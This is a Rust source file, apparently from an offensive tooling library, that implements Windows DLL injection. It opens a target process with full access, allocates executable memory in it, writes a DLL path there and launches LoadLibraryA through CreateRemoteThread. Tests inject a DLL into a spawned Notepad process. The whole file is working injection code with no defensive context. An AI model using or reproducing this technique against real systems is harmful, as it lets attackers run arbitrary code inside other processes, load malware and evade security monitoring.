use std::ffi::c_void;
use std::{time, thread, process};

use anyhow::Result;
use starlark::values::none::NoneType;
use sysinfo::{ProcessExt,System,SystemExt,PidExt};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Threading::OpenProcess;
use windows_sys::Win32::System::Threading::PROCESS_ALL_ACCESS;
use windows_sys::Win32::System::Memory::VirtualAllocEx;
use windows_sys::Win32::System::Memory::{MEM_RESERVE,MEM_COMMIT,PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Threading::CreateRemoteThread;
use windows_sys::Win32::Foundation::CloseHandle;

pub fn dll_inject(dll_path: String, pid: u32) -> Result<NoneType> {
    unsafe {
        // Get the kernel32.dll base address
        let h_kernel32 = GetModuleHandleA("kernel32.dll\0".as_bytes().as_ptr() as *const u8);
        // Get the address of the kernel function LoadLibraryA
        let lb = GetProcAddress(h_kernel32, "LoadLibraryA\0".as_bytes().as_ptr() as *const u8).unwrap();

        // Open a handle to the remote process
        let ph = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

        // Allocate memory in the remote process that we'll copy the DLL path string to.
        let rb = VirtualAllocEx(ph, 0 as *const c_void, dll_path.len()+1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // Write the DLL path into the remote processes newly allocated memory
        let write_proccess_memory_res = WriteProcessMemory(ph, rb, dll_path.as_bytes().as_ptr() as *const c_void, dll_path.len(), 0 as *mut usize);

        let rt = CreateRemoteThread(ph, 0 as *const SECURITY_ATTRIBUTES, 0, Some(std::mem::transmute::<_, extern "system" fn(_) -> _>(lb)), rb, 0, 0 as *mut u32);
        CloseHandle(ph);
      
        // println!("{}", process::id());
        // println!("kernel32 {:?}", h_kernel32 as *const isize);
        // println!("lb {:?}", lb as *const ());
        // println!("ph {:?}", ph as *const isize);
        // println!("rb {:?}", rb as *const c_void);
        // println!("phmodule {:?}", phmodule);
    }
    Ok(NoneType)
}

#[cfg(test)]
mod tests {
    use super::*;
    use core::time;
    use std::{process::Command, thread, path::Path, fs};
    use sysinfo::{Pid, Signal};

    fn find_first_process_of_name(process_name: String) -> Result<u32> {
        let mut sys = System::new();
        sys.refresh_processes();
        for (pid, process) in sys.processes() {
            if String::from(process.name()) == process_name {
                return Ok(pid.as_u32())
            }
        }
        return Err(anyhow::anyhow!(format!("No process of name {} found", process_name)));
    }
    
    #[test]
    fn test_dll_inject() -> anyhow::Result<()>{
        
        let test_dll_path = "C:\\Users\\Jack McKenna\\Documents\\test_dll\\target\\debug\\test_dll.dll".to_string();

        let expected_process = Command::new("C:\\Windows\\System32\\notepad.exe").spawn();
        let target_pid = expected_process.unwrap().id();

        let _res = dll_inject(test_dll_path, target_pid);
        
        let delay = time::Duration::from_secs(1);
        thread::sleep(delay);
        let test_path = Path::new("C:\\Users\\Jack McKenna\\Desktop\\win2.txt");

        assert!(test_path.is_file());

        let _ = fs::remove_file(test_path);
        Ok(())
    }

    #[test]
    fn test_find_first_process_of_name() -> anyhow::Result<()>{
        let process_name = "notepad.exe";
        let expected_process = Command::new("C:\\Windows\\System32\\notepad.exe").spawn();
        
        let expected_pid = expected_process.unwrap().id();
        let process_pid = find_first_process_of_name(process_name.to_string());

        let mut sys = System::new();
        sys.refresh_processes();
        if let Some(process) = sys.process(Pid::from_u32(expected_pid)) {
            process.kill_with(Signal::Kill);
        }
    
        assert_eq!(expected_pid, process_pid.unwrap());

        Ok(())
    }
}